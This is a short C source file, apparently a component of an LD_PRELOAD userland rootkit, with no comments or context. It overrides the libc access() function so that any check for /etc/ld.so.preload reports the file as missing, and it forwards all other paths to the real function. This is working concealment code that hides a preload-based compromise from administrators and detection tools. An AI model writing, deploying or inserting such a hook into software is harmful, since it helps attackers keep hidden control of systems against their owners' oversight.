#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <string.h>

typedef int (*orig_access_f_type)(const char* pathname, int flags);

int access(const char* path, int amode) {
    if (strcmp(path, "/etc/ld.so.preload") == 0) {
        errno = ENOENT;
        return -1;
    }
    orig_access_f_type orig_access;
    orig_access = (orig_access_f_type)dlsym(RTLD_NEXT, "access");
    return orig_access(path, amode);
}
